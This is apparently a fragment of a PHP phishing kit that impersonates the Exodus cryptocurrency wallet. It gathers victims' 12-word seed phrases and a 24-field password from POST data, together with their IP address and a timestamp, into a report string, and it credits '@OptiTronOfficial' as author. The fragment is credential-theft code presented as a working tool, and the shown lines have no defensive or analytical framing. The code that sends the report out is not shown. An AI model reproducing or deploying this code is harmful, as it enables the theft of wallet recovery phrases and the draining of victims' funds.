...
〚📜 𝗦𝗲𝗲𝗱𝗣𝗵𝗿𝗮𝘀𝗲〛 = '.$_POST['p1'].' '.$_POST['p2'].' '.$_POST['p3'].' '.$_POST['p4'].' '.$_POST['p5'].' '.$_POST['p6'].' '.$_POST['p7'].' '.$_POST['p8'].' '.$_POST['p9'].' '.$_POST['p10'].' '.$_POST['p11'].' '.$_POST['p12'].' 
[+]━━━━【💻 System】━━━[+]
[🌐 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[=====🥷 Main Author: @OptiTronOfficial=====]
    ';
    ...
    $yagmai .= '
        [========💠𝗘𝗫𝗢𝗗𝗨𝗦 𝗟𝗢𝗚𝗜𝗡💠=====]
[👤𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱] = '.$_POST['pp1'].' '.$_POST['pp2'].' '.$_POST['pp3'].' '.$_POST['pp4'].' '.$_POST['pp5'].' '.$_POST['pp6'].' '.$_POST['pp7'].' '.$_POST['pp8'].' '.$_POST['pp9'].' '.$_POST['pp10'].' '.$_POST['pp11'].' '.$_POST['pp12'].' '.$_POST['pp13'].' '.$_POST['pp14'].' '.$_POST['pp15'].' '.$_POST['pp16'].' '.$_POST['pp17'].' '.$_POST['pp18'].' '.$_POST['pp19'].' '.$_POST['pp20'].' '.$_POST['pp21'].' '.$_POST['pp22'].' '.$_POST['pp23'].' '.$_POST['pp24'].'
[+]━━━━【💻 System】━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
    ';
